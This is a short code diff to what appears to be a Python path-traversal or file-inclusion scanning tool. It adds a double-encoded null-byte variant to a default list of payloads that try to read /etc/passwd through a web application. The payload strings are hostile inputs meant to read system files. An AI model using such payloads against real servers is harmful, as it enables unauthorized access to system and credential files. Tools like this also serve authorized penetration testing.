@@ -13,7 +13,7 @@ from requests.auth import HTTPBasicAuth
 
 class Payload:
 
-	def __init__(self, url, outfile, creds, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1, proxies=False, crawler=False):
+	def __init__(self, url, outfile, creds, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00", "%2Fetc%2Fpasswd%2500"], verbosity=1, proxies=False, crawler=False):
 		self.url = url.strip()
 		self.verbosity = verbosity
 		self.outfile = outfile
